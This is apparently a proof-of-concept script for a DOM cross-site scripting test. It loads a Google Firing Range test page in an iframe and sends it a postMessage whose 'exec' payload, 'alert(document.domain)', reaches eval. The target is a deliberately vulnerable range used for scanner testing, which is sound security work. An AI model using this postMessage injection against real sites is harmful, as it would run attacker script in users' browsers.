var frame = document.getElementById("frame");
frame.addEventListener("load", () => {
    frame.contentWindow.postMessage({'action':'exec', 'payload':'alert(document.domain)'},"*")
});
frame.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval";
